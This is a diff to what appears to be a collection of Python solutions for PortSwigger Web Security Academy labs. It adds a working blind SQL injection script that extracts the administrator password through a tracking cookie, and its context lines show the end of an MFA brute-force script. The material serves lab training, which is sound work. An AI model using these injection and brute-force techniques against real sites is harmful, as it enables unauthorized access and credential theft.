@@ -160,7 +160,6 @@ def brute_force_stricter_broken_mfa():
         burpr.prepare(req)
 
         res = client.get(req.url, headers=req.headers)
-
         soup = BeautifulSoup(res, "html.parser")
         csrf = soup.find(attrs={"name": "csrf"})["value"]
 
@@ -183,4 +182,60 @@ def brute_force_stricter_broken_mfa():
             break
 
 brute_force_stricter_broken_mfa()
+```
+## Blind SQL injection with conditional responses
+``` python
+import burpr
+import httpx
+import sys
+
+burp_req = r'''GET /filter?category=Gifts HTTP/2
+Host: xxxx.web-security-academy.net
+Cookie: TrackingId=aaaabbbbbcccccdddddd; session=aaaabbbbbcccccdddddd
+Sec-Ch-Ua: 
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: ""
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://xxxx.web-security-academy.net/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9'''
+
+alphabet = "abcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*()_-+="
+
+# determine password length
+req = burpr.parse_string(burp_req)
+client = httpx.Client(http2=True)
+
+length = 0
+while length < 255:
+  payload = f"' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)={length + 1})='a"
+
+  req.set_header("Cookie", f"TrackingId=aaaabbbbbcccccdddddd{payload}; session=aaaabbbbbcccccdddddd")
+  res = client.get(req.url, headers=req.headers)
+  
+  length = length + 1
+
+  if "Welcome back" in res.text:
+    break
+
+print(f"[*] Password length is {length}, retrieving password:")
+
+# retrieve password
+for i in range(length):
+  for letter in alphabet:
+    payload = f"' AND (SELECT SUBSTRING(password,{i + 1},1) FROM users WHERE username='administrator')='{letter}"
+
+    req.set_header("Cookie", f"TrackingId=aaaabbbbbcccccdddddd{payload}; session=aaaabbbbbcccccdddddd")
+    res = client.get(req.url, headers=req.headers)
+  
+    if "Welcome back" in res.text:
+      sys.stdout.write(letter)
+      sys.stdout.flush()
+      break
 ```
